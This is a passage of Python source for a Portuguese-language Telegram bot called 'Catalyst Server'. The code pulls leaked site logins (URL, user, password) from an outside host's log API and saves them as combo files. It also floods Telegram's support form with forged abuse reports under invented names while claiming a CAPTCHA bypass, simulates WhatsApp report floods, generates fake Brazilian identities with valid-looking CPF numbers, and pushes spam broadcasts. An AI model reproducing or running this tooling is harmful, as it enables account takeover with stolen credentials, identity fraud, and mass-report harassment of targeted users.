    estado = random.choice(list(estados_cidades.keys()))
    cidade = random.choice(estados_cidades[estado])

    # Gerar CEP brasileiro
    def gerar_cep():
        return f"{random.randint(10000, 99999):05d}-{random.randint(100, 999):03d}"

    # Gerar email baseado no nome
    def gerar_email():
        dominios = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com", "uol.com.br", "terra.com.br"]
        nome_email = nome.lower().replace(" ", "")
        sobrenome_email = sobrenome.lower()
        numero = random.randint(1, 999)

        patterns = [
            f"{nome_email}.{sobrenome_email}@{random.choice(dominios)}",
            f"{nome_email}{sobrenome_email}@{random.choice(dominios)}",
            f"{nome_email}.{sobrenome_email}{numero}@{random.choice(dominios)}",
            f"{nome_email}{numero}@{random.choice(dominios)}"
        ]

        return random.choice(patterns)

    cpf = gerar_cpf_valido()
    rg = gerar_rg_valido()

    return {
        "nome": nome_completo,
        "genero": "Masculino" if genero == "M" else "Feminino",
        "data_nascimento": gerar_data_nascimento(),
        "cpf": cpf,
        "rg": rg,
        "telefone": gerar_telefone(),
        "email": gerar_email(),
        "endereco": gerar_endereco(),
        "cidade": cidade,
        "estado": estado,
        "cep": gerar_cep(),
        "nacionalidade": "Brasileira"
    }



def check_site_status(url):
    """Verifica status de um site"""
    try:
        response = requests.get(url, timeout=5, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        return {
            "status": "🟢 ONLINE" if response.status_code == 200 else f"🔴 ERROR {response.status_code}",
            "response_time": round(response.elapsed.total_seconds() * 1000, 2)
        }
    except:
        return {
            "status": "🔴 OFFLINE",
            "response_time": None
        }

# Funções do sistema de divulgação
def eh_dono(user_id):
    """Verifica se o usuário é o dono"""
    return user_id == DONO_ID

def eh_autorizado(user_id):
    """Verifica se o usuário está autorizado a usar o bot e não expirou"""
    if user_id not in usuarios_autorizados_sistema:
        return False

    # Verificar se tem data de expiração no banco
    try:
        cursor.execute("SELECT data_expiracao FROM usuarios WHERE id = ?", (user_id,))
        result = cursor.fetchone()

        if result and result[0]:  # Se tem data de expiração
            data_expiracao = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
            agora = datetime.now()

            if agora > data_expiracao:
                # Usuário expirado, remover da lista de autorizados
                usuarios_autorizados_sistema.discard(user_id)
                return False

        return True
    except Exception as e:
        print(f"❌ Erro ao verificar expiração: {e}")
        return user_id in usuarios_autorizados_sistema

async def bot_eh_admin(chat_id):
    """Verifica se o bot é admin no chat"""
    try:
        me = await bot.get_me()
        participants = await bot.get_participants(chat_id, filter=types.ChannelParticipantsAdmins)
        return any(admin.id == me.id for admin in participants)
    except Exception as e:
        print(f"❌ Erro ao verificar admin: {e}")
        return False

async def enviar_divulgacao():
    """Envia mensagens de divulgação para todos os chats autorizados"""
    global divulgacao_ativa

    while divulgacao_ativa:
        for chat_id in chats_autorizados:
            try:
                await bot.send_message(chat_id, texto_divulgacao, parse_mode='md')
                print(f"✅ Mensagem enviada para o chat {chat_id}")

                # Notificar o dono
                try:
                    chat_info = await bot.get_entity(chat_id)
                    chat_name = getattr(chat_info, 'title', getattr(chat_info, 'username', str(chat_id)))
                    await bot.send_message(DONO_ID, f"📤 **Divulgação enviada:**\n• Chat: {chat_name}\n• ID: {chat_id}")
                except:
                    pass

            except Exception as e:
                print(f"❌ Erro ao enviar para chat {chat_id}: {e}")

                # Remover chat se der erro de permissão
                if "forbidden" in str(e).lower() or "kicked" in str(e).lower():
                    chats_autorizados.remove(chat_id)
                    try:
                        await bot.send_message(DONO_ID, f"⚠️ **Chat removido automaticamente:**\n• ID: {chat_id}\n• Motivo: {str(e)[:100]}")
                    except:
                        pass

        # Aguardar 20 minutos (1200 segundos)
        await asyncio.sleep(1200)

# Classes auxiliares
class LoginSearch:
    def __init__(self, url, id_user, pasta_temp, cancel_flag, contador_callback=None):
        self.url = url
        self.id_user = id_user
        self.pasta_temp = pasta_temp
        self.cancel_flag = cancel_flag
        self.contador_callback = contador_callback
        os.makedirs(self.pasta_temp, exist_ok=True)

    def buscar(self):
        raw_path = os.path.join(self.pasta_temp, f"{self.id_user}.txt")
        formatado_path = os.path.join(self.pasta_temp, f"{self.id_user}_formatado.txt")

        contador = 0
        limite = 80000
        regex_valido = re.compile(r'^[a-zA-Z0-9!@#$%^&*()\-_=+\[\]{}|;:\'\",.<>/?`~\\]+$')

        http = urllib3.PoolManager()

        try:
            response = http.request('GET', f"https://patronhost.online/logs/api_sse.php?url={self.url}", preload_content=False)
            client = SSEClient(response)

            with open(raw_path, "w", encoding="utf-8") as f_raw, open(formatado_path, "w", encoding="utf-8") as f_fmt:
                for event in client.events():
                    if self.cancel_flag.get('cancelled'):
                        break
                    if contador >= limite:
                        break
                    try:
                        data = json.loads(event.data)
                        url_ = data.get("url", "")
                        user = data.get("user", "")
                        passwd = data.get("pass", "")
                        if url_ and user and passwd and user.upper() != "EMPTY":
                            user_limpo = ''.join(ch for ch in user if regex_valido.match(ch)).replace(" ", "")
                            passwd_limpo = ''.join(ch for ch in passwd if regex_valido.match(ch)).replace(" ", "")
                            if user_limpo and passwd_limpo:
                                f_raw.write(f"{user_limpo}:{passwd_limpo}\n")
                                f_fmt.write(f"• URL: {url_}\n• USUÁRIO: {user_limpo}\n• SENHA: {passwd_limpo}\n\n")
                                contador += 1
                                if self.contador_callback:
                                    self.contador_callback(contador)
                    except json.JSONDecodeError:
                        continue
        except Exception:
            pass
        finally:
            if 'response' in locals():
                response.release_conn()

        return raw_path, formatado_path



class RelatorioPremium:
    def __init__(self, nome, id_user, time, url_search, quantidade):
        self.largura = 1600
        self.altura = 800
        self.fundo_escuro = (8, 18, 45)
        self.cor_texto = (245, 245, 255)
        self.cor_secundaria = (60, 95, 180)
        self.cor_destaque = (80, 190, 240)
        self.cor_icones = (120, 220, 255)
        self.margem = 70
        self.espacamento = 90
        self.nome = nome
        self.id_user = id_user
        self.time = time
        self.url_search = url_search
        self.quantidade = quantidade
        self.imagem = Image.new("RGB", (self.largura, self.altura), self.fundo_escuro)
        self.draw = ImageDraw.Draw(self.imagem)
        self.carregar_fontes()
        self.criar_icones()

    def gerar_hash(self):
        texto = f"{self.nome}{self.id_user}"
        return hashlib.md5(texto.encode()).hexdigest()[:8]

    def carregar_fontes(self):
        try:
            sizes = {'titulo': 38, 'subtitulo': 26, 'destaque': 42, 'normal': 32, 'secundario': 24}
            self.fontes = {name: ImageFont.load_default() for name in sizes.keys()}
        except:
            self.fontes = {name: ImageFont.load_default() for name in ['titulo', 'subtitulo', 'destaque', 'normal', 'secundario']}

    def criar_icones(self):
        self.icones = {
            'user': self.criar_icone_redondo("👤", 60, self.cor_icones),
            'id': self.criar_icone_redondo("🆔", 60, (120, 220, 180)),
            'time': self.criar_icone_redondo("🕒", 60, (220, 180, 100)),
            'hash': self.criar_icone_redondo("🔑", 60, (200, 150, 240)),
            'web': self.criar_icone_redondo("🌐", 60, (100, 200, 240)),
            'qtd': self.criar_icone_redondo("🔢", 60, (150, 240, 150))
        }

    def criar_icone_redondo(self, emoji, tamanho, cor):
        img = Image.new("RGBA", (tamanho, tamanho))
        draw = ImageDraw.Draw(img)
        draw.ellipse((0, 0, tamanho, tamanho), fill=(*cor[:3], 30))
        try:
            bbox = draw.textbbox((0, 0), emoji, font=self.fontes['destaque'])
            w, h = bbox[2]-bbox[0], bbox[3]-bbox[1]
        except:
            w, h = 20, 20
        draw.text(((tamanho-w)//2, (tamanho-h)//2-5), emoji, font=self.fontes['destaque'], fill=(*cor[:3], 200))
        return img

    def criar_degradê(self):
        for x in range(self.largura):
            r = int(8 + 30 * (x/self.largura)**0.5)
            g = int(18 + 40 * (x/self.largura)**0.7)
            b = int(45 + 50 * (x/self.largura))
            self.draw.line([(x, 0), (x, self.altura)], fill=(r, g, b))

    def criar_card(self):
        try:
            self.draw.rounded_rectangle(
                (self.margem, self.margem, self.largura-self.margem, self.altura-self.margem),
                radius=40, fill=(*self.cor_secundaria[:3], 200))
        except:
            self.draw.rectangle(
                (self.margem, self.margem, self.largura-self.margem, self.altura-self.margem),
                fill=self.cor_secundaria)

    def desenhar_logo(self):
        tamanho = 200
        x = self.largura - self.margem - tamanho//2 - 20
        y = self.margem + tamanho//2 + 20
        self.draw.ellipse((x-tamanho//2, y-tamanho//2, x+tamanho//2, y+tamanho//2), outline=self.cor_destaque, width=5)

        texto1 = "CATALYST"
        try:
            bbox1 = self.draw.textbbox((0, 0), texto1, font=self.fontes['titulo'])
            w1, h1 = bbox1[2] - bbox1[0], bbox1[3] - bbox1[1]
        except:
            w1, h1 = 100, 30
        self.draw.text((x-w1//2, y-h1-15), texto1, font=self.fontes['titulo'], fill=self.cor_destaque)

        texto2 = "SERVER"
        try:
            bbox2 = self.draw.textbbox((0, 0), texto2, font=self.fontes['subtitulo'])
            w2, h2 = bbox2[2] - bbox2[0], bbox2[3] - bbox2[1]
        except:
            w2, h2 = 80, 20
        self.draw.text((x-w2//2, y+15), texto2, font=self.fontes['subtitulo'], fill=self.cor_texto)

    def desenhar_conteudo(self):
        titulo = "CONFIRMACAO DE LOGIN"
        try:
            bbox = self.draw.textbbox((0, 0), titulo, font=self.fontes['titulo'])
            w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        except:
            w, h = 300, 30
        self.draw.text(((self.largura - w) // 2, self.margem + 20), titulo, font=self.fontes['titulo'], fill=self.cor_texto)

        dados = [
            ("user", "NOME:", self.nome),
            ("id", "ID:", str(self.id_user)),
            ("time", "DATA:", self.time),
            ("hash", "HASH:", self.gerar_hash()),
            ("web", "URL:", self.url_search),
            ("qtd", "QTDS:", str(self.quantidade))
        ]

        y = self.margem + 130
        altura_icone = 60
        x_icone = self.margem + 40
        x_texto = x_icone + altura_icone + 30
        x_valor = x_texto + 300

        for chave, label, valor in dados:
            icon = self.icones[chave]
            self.imagem.paste(icon, (x_icone, y - altura_icone // 2), icon)

            self.draw.text((x_texto, y - 15), label, font=self.fontes['destaque'], fill=self.cor_texto)

            valor_formatado = valor if len(valor) <= 50 else valor[:47] + "..."
            self.draw.text((x_valor, y - 15), valor_formatado, font=self.fontes['normal'], fill=(255, 255, 255))

            y += self.espacamento

# Funções para reports
def generate_name():
    first_names = ["João", "Pedro", "Lucas", "Ana", "Maria", "Carlos", "José", "Marcos", "Felipe", "Gabriel"]
    last_names = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Costa"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def generate_email(name):
    domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com"]
    name_part = name.lower().replace(" ", "")
    return f"{name_part}{random.randint(10, 9999)}@{random.choice(domains)}"

def generate_phone():
    ddds = [11, 21, 31, 41, 51, 61, 71, 81, 85]
    ddd = random.choice(ddds)
    number = random.randint(900000000, 999999999)
    return f"+55{ddd}{number}"

def send_single_report():
    legal_name = generate_name()

    user_data = {
        "legal_name": legal_name,
        "email": generate_email(legal_name),
        "phone": generate_phone(),
        "setln": ""
    }

    message = f"{report_data['text']}\n\nLink: {report_data['link']}"

    form_data = {
        "message": message,
        "legal_name": user_data["legal_name"],
        "email": user_data["email"],
        "phone": user_data["phone"],
        "setln": user_data["setln"],
        "cf-turnstile-response": "bypass"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://telegram.org/support",
        "Origin": "https://telegram.org",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.post(
            "https://telegram.org/support",
            data=form_data,
            headers=headers,
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

def send_single_whatsapp_report():
    legal_name = generate_name()

    user_data = {
        "legal_name": legal_name,
        "email": generate_email(legal_name),
        "phone": generate_phone(),
        "setln": ""
    }

    message = f"Denúncia contra número WhatsApp: {whatsapp_report_data['phone']}\n\nMotivo: Spam, golpes ou atividades suspeitas."

    form_data = {
        "message": message,
        "legal_name": user_data["legal_name"],
        "email": user_data["email"],
        "phone": user_data["phone"],
        "setln": user_data["setln"],
        "reported_phone": whatsapp_report_data['phone'],
        "platform": "whatsapp"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://faq.whatsapp.com/general/security-and-privacy/how-to-report-spam-or-block-a-contact",
        "Origin": "https://whatsapp.com",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Simular envio de report (WhatsApp não tem API pública para reports)
    # Em um cenário real, isso seria conectado ao sistema oficial do WhatsApp
    try:
        import time
        time.sleep(random.uniform(0.1, 0.5))  # Tempo de processamento reduzido para maior velocidade
        return random.choice([True, True, True, True, False])  # 80% de sucesso simulado
    except:
        return False

async def send_reports_async(user_id):
    global report_data

    while report_data["running"] and report_data["counter"] < report_data["quantity"]:
        if await asyncio.to_thread(send_single_report):
            report_data["counter"] += 1

            if report_data["counter"] % 5 == 0:
                elapsed_time = (datetime.now() - report_data["start_time"]).total_seconds()
                speed = report_data["counter"] / elapsed_time if elapsed_time > 0 else 0

                status_msg = (
                    f"⚡ **REPORT #{report_data['counter']} ENVIADO**\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 **PROGRESSO:** `{report_data['counter']}/{report_data['quantity']}`\n"
                    f"🚀 **VELOCIDADE:** `{speed:.2f}/seg`\n"
                    f"⏱️ **TEMPO:** `{int(elapsed_time)}s`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                )

                try:
                    await bot.send_message(user_id, status_msg)
                except:
                    pass

        await asyncio.sleep(0.1)

    if report_data["counter"] >= report_data["quantity"]:
        elapsed_time = (datetime.now() - report_data["start_time"]).total_seconds()
        final_speed = report_data["counter"] / elapsed_time if elapsed_time > 0 else 0

        await bot.send_message(
            user_id,
            f"🎉 Processo concluído!\n"
            f"✅ {report_data['quantity']} reports enviados\n"
            f"⚡ Velocidade média: {final_speed:.2f} reports/segundo\n"
            f"⏱ Tempo total: {int(elapsed_time)}s"
        )

    report_data["running"] = False

async def send_whatsapp_reports_async(user_id):
    global whatsapp_report_data

    while whatsapp_report_data["running"] and whatsapp_report_data["counter"] < whatsapp_report_data["quantity"]:
        if await asyncio.to_thread(send_single_whatsapp_report):
            whatsapp_report_data["counter"] += 1

            if whatsapp_report_data["counter"] % 5 == 0:
                if whatsapp_report_data["start_time"]:
                    elapsed_time = (datetime.now() - whatsapp_report_data["start_time"]).total_seconds()
                    speed = whatsapp_report_data["counter"] / elapsed_time if elapsed_time > 0 else 0
                else:
                    elapsed_time = 0
                    speed = 0

                status_msg = (
                    f"📱 Report WhatsApp [{whatsapp_report_data['counter']}] enviado!\n"
                    f"📊 Estatísticas:\n"
                    f"• Número: {whatsapp_report_data['phone']}\n"
                    f"• Total enviados: {whatsapp_report_data['counter']}/{whatsapp_report_data['quantity']}\n"
                    f"• Velocidade: {speed:.2f} reports/segundo\n"
                    f"• Tempo decorrido: {int(elapsed_time)}s"
                )

                try:
                    await bot.send_message(user_id, status_msg)
                except:
                    pass

        await asyncio.sleep(random.uniform(0.3, 0.8))  # Delay reduzido para maior velocidade

    if whatsapp_report_data["counter"] >= whatsapp_report_data["quantity"]:
        if whatsapp_report_data["start_time"]:
            elapsed_time = (datetime.now() - whatsapp_report_data["start_time"]).total_seconds()
            final_speed = whatsapp_report_data["counter"] / elapsed_time if elapsed_time > 0 else 0
        else:
            elapsed_time = 0
            final_speed = 0

        await bot.send_message(
            user_id,
            f"🎉 Reports WhatsApp concluídos!\n"
            f"📱 Número reportado: {whatsapp_report_data['phone']}\n"
            f"✅ {whatsapp_report_data['quantity']} reports enviados\n"
            f"⚡ Velocidade média: {final_speed:.2f} reports/segundo\n"
            f"⏱ Tempo total: {int(elapsed_time)}s"
        )

    whatsapp_report_data["running"] = False

def termo_valido(termo):
    if not termo or not termo.strip():
        return False
    termo = termo.strip()
    if ' ' in termo:
        return False
    padrao_url = re.compile(
        r'^(https?:\/\/)?'
        r'([a-zA-Z0-9.-]+)'
        r'\.([a-zA-Z]{2,})'
        r'(\/.*)?$',
        re.IGNORECASE
    )
    return bool(padrao_url.match(termo))

def calcular_similaridade(s1, s2):
    """Calcula a similaridade entre duas strings usando SequenceMatcher"""
    return SequenceMatcher(None, s1.lower(), s2.lower()).ratio()

def encontrar_comando_similar(comando_errado):
    """Encontra o comando mais similar ao digitado"""
    comandos_validos = [
        '/start', '/ping', '/search', '/webscraper', '/report', '/report2', 
        '/reportwpp', '/reset', '/checker', '/geradores', '/comandos', '/on', 
        '/off', '/addchat', '/removechat', '/listchats', '/divconfig', '/testdiv'
    ]

    # Remover / do comando se existir
    comando_limpo = comando_errado.lstrip('/').lower()

    melhor_comando = None
    melhor_similaridade = 0

    # Primeiro, verificar correspondências exatas parciais
    for comando in comandos_validos:
        comando_sem_barra = comando.lstrip('/').lower()

        # Verificar se o comando digitado está contido no comando válido
        if comando_limpo in comando_sem_barra or comando_sem_barra in comando_limpo:
            return comando, 1.0

        # Calcular similaridade normal
        similaridade = calcular_similaridade(comando_limpo, comando_sem_barra)

        if similaridade > melhor_similaridade:
            melhor_similaridade = similaridade
            melhor_comando = comando

    # Verificar comandos comuns com erros de digitação
    comandos_comuns = {
        'strat': '/start',
        'star': '/start', 
        'stat': '/start',
        'seach': '/search',
        'searh': '/search',
        'serach': '/search',
        'buscar': '/search',
        'webscrapper': '/webscraper',
        'scraper': '/webscraper',
        'scrapper': '/webscraper',
        'repot': '/report',
        'reporte': '/report',
        'reportt': '/report',
        'check': '/checker',
        'checher': '/checker',
        'cheker': '/checker',
        'res': '/reset',
        'resset': '/reset',
        'command': '/comandos',
        'comando': '/comandos',
        'cmd': '/comandos'
    }

    if comando_limpo in comandos_comuns:
        return comandos_comuns[comando_limpo], 0.9

    # Só sugerir se a similaridade for maior que 0.3 (30%)
    if melhor_similaridade > 0.3:
        return melhor_comando, melhor_similaridade

    return None, 0

async def verificar_comando_errado(event):
    """Verifica se uma mensagem é um comando inválido e sugere correção"""
    texto = event.raw_text.strip()

    # Verificar se parece com um comando (começa com /)
    if not texto.startswith('/'):
        return False

    # Extrair apenas o comando (primeira palavra)
    comando = texto.split()[0].lower()

    # Lista de comandos válidos
    comandos_validos = [
        '/start', '/ping', '/search', '/webscraper', '/report', '/report2', 
        '/reportwpp', '/reset', '/checker', '/geradores', '/comandos', '/on', 
        '/off', '/addchat', '/removechat', '/listchats', '/divconfig', '/testdiv'
    ]

    # Se o comando é válido, não fazer nada
    if comando in comandos_validos:
        return False

    # Procurar comando similar
    comando_similar, similaridade = encontrar_comando_similar(comando)

    if comando_similar and similaridade > 0.3:  # Diminuir threshold para mais sugestões
        user_id = event.sender_id

        # Mensagem de correção com sugestão
        await event.reply(
            f"❌ **COMANDO INVÁLIDO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 **Comando digitado:** `{comando}`\n\n"
            f"💡 **Você quis dizer:** `{comando_similar}`?\n"
            f"📊 **Similaridade:** `{similaridade:.0%}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📋 **COMANDOS MAIS USADOS:**\n"
            "• `/start` - Iniciar o bot\n"
            "• `/search [url]` - Buscar logins\n"
            "• `/webscraper [url]` - Extrair dados\n"
            "• `/report` - Reports Telegram\n"
            "• `/checker` - Ferramentas Checker\n"
            "• `/geradores` - Ferramentas de Geração\n"
            "• `/comandos` - Ver todos os comandos\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline(f"✅ Usar {comando_similar}", data=f"use_command:{comando_similar}:{user_id}")],
                [Button.inline("📋 Áreas de Comando", data=f"show_commands:{user_id}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{user_id}")]
            ]
        )
        return True
    else:
        # Se não encontrou comando similar suficiente
        user_id = event.sender_id
        await event.reply(
            f"❌ **COMANDO NÃO RECONHECIDO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 **Comando digitado:** `{comando}`\n\n"
            "❓ **Comando não encontrado.**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📋 **COMANDOS PRINCIPAIS:**\n"
            "• `/start` - Iniciar o bot\n"
            "• `/search [url]` - Buscar logins\n"
            "• `/webscraper [url]` - Extrair dados\n"
            "• `/report` - Reports Telegram\n"
            "• `/report2` - Reports avançados\n"
            "• `/reportwpp` - Reports WhatsApp\n"
            "• `/checker` - Ferramentas Checker\n"
            "• `/geradores` - Ferramentas de Geração\n"
            "• `/reset` - Resetar dados\n"
            "• `/comandos` - Ver lista completa\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("📋 Áreas de Comando", data=f"show_commands:{user_id}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{user_id}")]
            ]
        )
        return True

# Handlers dos eventos
# Comando especial para testar integração com site externo
@bot.on(events.NewMessage(pattern=r'^/test_consultcenter$'))
async def test_consultcenter_external(event):
    """Comando especial para testar a integração com site externo"""
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    user_id = event.sender_id

    await event.reply(
        f"🧪 **TESTE DE INTEGRAÇÃO CONSULTCENTER**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 **Este comando testa:**\n"
        "• Integração com sites externos\n"
        "• Análise automática de formulários\n"
        "• Extração de resultados\n"
        "• Separação de LIVE/DIE\n\n"
        "💡 **Como usar:**\n"
        "1. Clique em 'Testar Integração'\n"
        "2. Cole a URL do site de checker\n"
        "3. Cole alguns combos de teste\n"
        "4. Veja a mágica acontecer! ✨\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[
            [Button.inline("🧪 Testar Integração", data=f"test_external_integration:{user_id}")],
            [Button.inline("📋 Ver Exemplo", data=f"show_integration_example:{user_id}")],
            [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{user_id}")]
        ]
    )

@bot.on(events.NewMessage(pattern=r'^/start$'))
async def start_handler(event):
    try:
        print(f"📥 Comando /start recebido de {event.sender_id}")

        # Verificar autorização
        if not eh_autorizado(event.sender_id):
            await event.reply(
                "🚫 **ACESSO NEGADO**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "❌ **Você não tem autorização para usar este bot.**\n\n"
                "💡 **Para obter acesso:**\n"
                "• Entre em contato com o administrador\n"
                "• Solicite autorização fornecendo seu ID\n\n"
                f"🆔 **Seu ID:** `{event.sender_id}`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot"
            )
            return

        user = await bot(GetFullUserRequest(event.sender_id))
        u = user.users[0]
        nome = u.first_name or ''
        sobrenome = u.last_name or ''
        user_id = u.id
        hash_user = hashlib.md5(f"{nome}{user_id}".encode()).hexdigest()[:8]
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        cursor.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
        if cursor.fetchone() is None:
            cursor.execute(
                "INSERT INTO usuarios (id, nome, sobrenome, hash, data_criada) VALUES (?, ?, ?, ?, ?)",
                (user_id, nome, sobrenome, hash_user, now)
            )
            conn.commit()

        mention = f"[{get_display_name(u)}](tg://user?id={user_id})"

        caption = f"""🚀 **CATALYST SERVER** 🚀

👋 **OLÁ {mention}, SEJA BEM-VINDO!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛠️ **FUNCIONALIDADES DISPONÍVEIS:**

🔍 `/search [url]` - Buscar logins
🕷️ `/webscraper [url]` - Extrair dados do site
📤 `/report` - Reports Telegram (básico)
⚡ `/report2` - Reports Telegram (avançado)
📱 `/reportwpp` - Reports WhatsApp  
🛡️ `/checker` - Checker Tools
🎲 `/geradores` - Ferramentas de Geração
🔄 `/reset` - Resetar dados

━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ **IMPORTANTE:** Use com responsabilidade!

🟢 **STATUS:** `GRÁTIS PARA TODOS`

━━━━━━━━━━━━━━━━━━━━━━━━━━━

💬 **PRECISA DE AJUDA? USE OS BOTÕES ABAIXO:**"""

        await event.reply(
            caption,
            buttons=[
                [Button.inline("📋 Comandos", data=f"show_commands:{user_id}")],
                [Button.url("🧑‍💻 | USUÁRIO DE SUPORTE", "https://t.me/Maygreit")]
            ]
        )
        print(f"✅ Resposta /start enviada para {user_id}")

    except Exception as e:
        print(f"❌ Erro no handler /start: {e}")
        try:
            await event.reply("❌ **Erro interno do bot. Tente novamente em alguns instantes.**")
        except:
            print("❌ Falha ao enviar mensagem de erro")

@bot.on(events.NewMessage(pattern=r'^/reset$'))
async def reset_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    sender = await event.get_sender()
    id_user = sender.id
    hash_nome = str(id_user)

    # Reset login search data
    tasks_canceladas[hash_nome] = True
    usuarios_bloqueados.discard(id_user)
    usuarios_autorizados.pop(id_user, None)
    mensagens_origem.pop(id_user, None)
    urls_busca.pop(id_user, None)
    tasks_canceladas.pop(hash_nome, None)

    # Reset report data
    global report_data, whatsapp_report_data
    if report_data["user_id"] == id_user:
        report_data["running"] = False
    if whatsapp_report_data["user_id"] == id_user:
        whatsapp_report_data["running"] = False

    pasta_temp = f"temp/{id_user}/"
    if os.path.exists(pasta_temp):
        shutil.rmtree(pasta_temp, ignore_errors=True)

    await event.reply(
        "🔄 **RESET CONCLUÍDO**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "✅ Dados resetados com sucesso!\n"
        "✅ Pesquisas canceladas\n"
        "✅ Reports interrompidos\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💡 Agora você pode usar todos os comandos novamente!\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user}")]]
    )

@bot.on(events.NewMessage(pattern=r'^/search (.+)'))
async def search_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    termo = event.pattern_match.group(1)
    sender = await event.get_sender()
    id_user = sender.id

    if not termo_valido(termo):
        return await event.reply(
            "🚫 **URL INVÁLIDA**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Exemplo correto:**\n"
            "`/search google.com`\n"
            "`/search facebook.com`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user}")]]
        )

    url = termo.strip()

    if id_user in usuarios_bloqueados:
        return await event.reply(
            "⛔ **AGUARDE SUA VEZ**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔄 Você já tem uma pesquisa em andamento!\n\n"
            "💡 **Para usar novamente:**\n"
            "• Aguarde a pesquisa atual terminar\n"
            "• Ou use `/reset` para cancelar\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user}")]]
        )

    usuarios_bloqueados.add(id_user)
    nome = f"{getattr(sender, 'first_name', '')} {getattr(sender, 'last_name', '')}".strip()
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    hash_nome = str(id_user)

    usuarios_autorizados[id_user] = hash_nome
    mensagens_origem[id_user] = event.id
    urls_busca[id_user] = url
    tasks_canceladas[hash_nome] = {'cancelled': False}

    pasta_temp = f"temp/{id_user}/"
    os.makedirs("temp", exist_ok=True)
    os.makedirs(pasta_temp, exist_ok=True)

    msg_busca = await event.reply(
        "🔍 **INICIANDO BUSCA...**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🌐 **URL:** `Analisando...`\n"
        "📊 **LOGINS ENCONTRADOS:** `0`\n"
        "⚡ **STATUS:** `Processando...`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[
            [Button.inline("⏹️ Parar", data=f"cancelarbusca:{id_user}")],
            [Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user}")]
        ]
    )

    contador_atual = 0

    def contador_callback(novo_contador):
        nonlocal contador_atual
        contador_atual = novo_contador

    async def editar_mensagem_periodicamente():
        while not tasks_canceladas[hash_nome]['cancelled']:
            await asyncio.sleep(3)
            try:
                await msg_busca.edit(
                    f"🔍 **BUSCA EM ANDAMENTO...**\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🌐 **URL:** `{urls_busca.get(id_user, 'N/A')}`\n"
                    f"📊 **LOGINS ENCONTRADOS:** `{contador_atual}`\n"
                    "⚡ **STATUS:** `Coletando dados...`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "🤖 @CatalystServerRobot",
                    buttons=[
                        [Button.inline("⏹️ Parar", data=f"cancelarbusca:{id_user}")],
                        [Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user}")]
                    ]
                )
            except:
                pass

    def buscar_wrapper():
